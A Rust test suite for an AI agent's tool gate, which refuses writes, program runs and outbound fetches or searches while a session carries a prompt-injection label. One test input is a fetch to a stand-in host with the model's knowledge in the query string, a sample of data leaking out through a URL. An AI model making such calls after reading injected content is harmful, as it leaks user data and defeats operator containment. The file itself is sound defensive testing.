//! The `injection` label's freeze, through the gate's own refusal
//! (theseus-9ymz0, design §4.1 and §11's tests 7 and 8, with the conductor's
//! correction): while a session carries `injection`, `ToolRuntime::refusal_at`
//! refuses everything but a **local** read of files and code, in words the model
//! can act on. A fetch, a search, a post and an MCP-shaped call are `Read` in
//! class, and each is an outbound send with the data in its query string, so
//! each is refused too. In `notify` mode nothing is refused. A session with no
//! label is refused nothing, and a local read never reads the labels.
//!
//! **`notify` is the default since 1.0.6** (the owner's S17-D8, 2026-11-12), so
//! every test here that wants the freeze writes `refuse` on its rig's config.
//! The mode is never read from the default, in either direction: each test says
//! which one it is testing.

// `AtomicU32` and not `Cell`: `At`'s `labels` is `Send + Sync` since
// theseus-p5kln, because the gate awaits a model with it in scope. The
// counting is the same, and every assertion below is unchanged.
use std::sync::atomic::{AtomicU32, Ordering};

use serde_json::{json, Value};
use theseus_judge::band::Band;

use crate::ceiling::PlaceView;
use crate::content::{ContentFlags, Flag, InjectionMode, ItemKind, Label};

/// The config of a daemon that has asked for the freeze: `refuse`, written out,
/// as the specialised security use writes it.
fn refusing(c: &mut crate::config::Config) {
    c.content_based_security.injection = InjectionMode::Refuse;
}
use crate::places::PlaceClass;
use crate::tests_route::{rig, Rig};
use crate::toolrun::order::At;

fn frozen() -> ContentFlags {
    let mut f = ContentFlags::default();
    f.raise(Label {
        flag: Flag::Injection,
        node: Some("nod_fetched".into()),
        kind: ItemKind::FetchedPage,
        source: "http.fetch https://elsewhere.example/page".into(),
        confidence: 0.95,
        band: Band::Act,
        at_ms: 1,
        judgment: String::new(),
    });
    f
}

/// What the gate's refusal says of `tool` called with `input`, for a session
/// whose labels `flags` are (read through the closure, which counts its calls).
fn refusal(
    r: &Rig,
    tool: &str,
    input: Value,
    flags: Option<ContentFlags>,
    reads: &AtomicU32,
) -> Option<String> {
    let rt = &r.core.tools;
    let tool = rt
        .registry
        .get(tool)
        .unwrap_or_else(|| panic!("{tool} is not registered"))
        .clone();
    let plan = tool
        .plan(&input, &rt.ctx)
        .unwrap_or_else(|e| panic!("{}: {e:?}", tool.name()));
    let mcp = || None;
    let labels = || {
        reads.fetch_add(1, Ordering::Relaxed);
        flags.clone()
    };
    let at = At {
        place: PlaceView {
            class: PlaceClass::Private,
            ceiling: None,
            voice: false,
        },
        labels: &labels,
        mcp: &mcp,
        glide: None,
        routine: None,
        session: Some("ses_frozen"),
        ctx: &rt.ctx,
    };
    rt.refusal_at(&at, &*tool, &plan)
}

/// The calls the freeze must stop, by tool, with an input each: writes,
/// programs, a task that would run later, and the sends outward that the tool's
/// class does not show.
fn stopped(r: &Rig) -> Vec<(&'static str, Value)> {
    let path = r.core.tools.ctx.cwd.join("a.txt");
    vec![
        ("fs.write", json!({"path": path, "content": "x\n"})),
        ("proc.run", json!({"argv": ["echo", "x"]})),
        ("task.create", json!({"brief": "do a thing"})),
        (
            "http.fetch",
            json!({"url": "https://elsewhere.example/?x=whatever-the-model-knows"}),
        ),
        ("web.search", json!({"query": "whatever the model knows"})),
    ]
}

/// Tests 7 and the correction: every one of those calls is refused, with the
/// message naming the flag and the removal command; and a local read runs.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_frozen_session_refuses_what_acts_and_everything_that_leaves_the_machine() {
    let r = rig(None, 1, refusing);
    let reads = AtomicU32::new(0);
    for (tool, input) in stopped(&r) {
        let why = refusal(&r, tool, input, Some(frozen()), &reads)
            .unwrap_or_else(|| panic!("{tool} was not refused"));
        assert!(why.contains("theseus content remove"), "{tool}: {why}");
        assert!(why.contains("was not run"), "{tool}: {why}");
        assert!(
            why.contains("injection") || why.contains("steer"),
            "{tool}: {why}"
        );
    }
    let path = r.core.tools.ctx.cwd.join("a.txt");
    assert_eq!(
        refusal(&r, "fs.read", json!({"path": path}), Some(frozen()), &reads),
        None,
        "a local read keeps its posture, so the session can be investigated"
    );
}

/// **At the shipped default, with no `[content_based_security]` table at all,**
/// a labelled session is refused nothing and its labels are never read. This is
/// the whole-gate half of the owner's S17-D8 (2026-11-12): his own daemon's
/// config names no such table, and on 2026-11-13 the `refuse` default froze his
/// DM session for a `proc.run`. Under the default the call runs and he is told.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn at_the_default_a_labelled_session_is_refused_nothing() {
    let r = rig(None, 1, |_| {});
    assert_eq!(
        r.core.cfg.content_based_security.injection,
        InjectionMode::Notify,
        "a rig with no tweak is the shipped default"
    );
    let reads = AtomicU32::new(0);
    for (tool, input) in stopped(&r) {
        assert_eq!(
            refusal(&r, tool, input, Some(frozen()), &reads),
            None,
            "{tool} is refused nothing at the default"
        );
    }
    assert_eq!(
        reads.load(Ordering::Relaxed),
        0,
        "the default never reads the labels"
    );
}

/// In `notify` mode, written out, the same calls are refused by nothing.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn notify_mode_refuses_nothing() {
    let r = rig(None, 1, |c| {
        c.content_based_security.injection = InjectionMode::Notify
    });
    let reads = AtomicU32::new(0);
    for (tool, input) in stopped(&r) {
        assert_eq!(
            refusal(&r, tool, input, Some(frozen()), &reads),
            None,
            "{tool}"
        );
    }
    assert_eq!(
        reads.load(Ordering::Relaxed),
        0,
        "notify never reads the labels"
    );
}

/// Test 9, in the gate: without `injection` on the session, nothing changes.
/// No label, and a session with other labels (a cn word freezes nothing).
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn without_injection_nothing_is_refused() {
    let r = rig(None, 1, refusing);
    let reads = AtomicU32::new(0);
    let mut other = ContentFlags::default();
    other.raise(Label {
        flag: Flag::Confidential,
        node: None,
        kind: ItemKind::ToolResult,
        source: "fs.read /srv/notes.txt".into(),
        confidence: 0.8,
        band: Band::Confirm,
        at_ms: 1,
        judgment: String::new(),
    });
    for flags in [None, Some(ContentFlags::default()), Some(other)] {
        for (tool, input) in stopped(&r) {
            assert_eq!(
                refusal(&r, tool, input, flags.clone(), &reads),
                None,
                "{tool}: {flags:?}"
            );
        }
    }
}

/// A session with no label costs no record read for a call that is a local
/// read: the labels are asked only past that test.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_local_read_never_reads_the_labels() {
    let r = rig(None, 1, refusing);
    let reads = AtomicU32::new(0);
    let path = r.core.tools.ctx.cwd.join("a.txt");
    assert_eq!(
        refusal(&r, "fs.read", json!({"path": path}), None, &reads),
        None
    );
    assert_eq!(reads.load(Ordering::Relaxed), 0);
    let (tool, input) = stopped(&r).remove(0);
    refusal(&r, tool, input, None, &reads);
    assert_eq!(reads.load(Ordering::Relaxed), 1, "a write asks, once");
}

/// R6 (theseus-gyjyo.8): removing the `injection` label is the one thing that lets a refused call run. On a
/// real session record, read as the gate reads it: refused while the label is on, run once the operator's
/// removal (`content.unlabel`, which Discord's `/trust` calls) has cleared it, and nothing else changed.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn removing_the_label_is_what_lets_the_refused_call_run() {
    use crate::session::SessionRecord;
    use theseus_protocol::SessionKind;
    let r = rig(None, 1, refusing);
    let mut rec = SessionRecord::new(SessionKind::Conversation, None);
    rec.data = Some(Box::new(frozen()));
    let sid = rec.session_id.clone();
    r.core.store.put_session(&sid, &rec).unwrap();
    let rt = &r.core.tools;
    let tool = rt.registry.get("proc.run").unwrap().clone();
    let input = json!({"argv": ["echo", "x"]});
    let plan = tool.plan(&input, &rt.ctx).unwrap();
    let mcp = || None;
    let labels = || crate::content_wait::flags_of(&r.core.store, &sid);
    let at = At {
        place: PlaceView {
            class: PlaceClass::Private,
            ceiling: None,
            voice: false,
        },
        labels: &labels,
        mcp: &mcp,
        glide: None,
        routine: None,
        session: Some(&sid),
        ctx: &rt.ctx,
    };
    let why = rt
        .refusal_at(&at, &*tool, &plan)
        .expect("refused with the label on");
    assert!(why.contains("theseus content remove"), "{why}");
    r.core.unlabel_session(&sid, "injection", "test").unwrap();
    assert_eq!(
        rt.refusal_at(&at, &*tool, &plan),
        None,
        "the removal lets it run"
    );
}
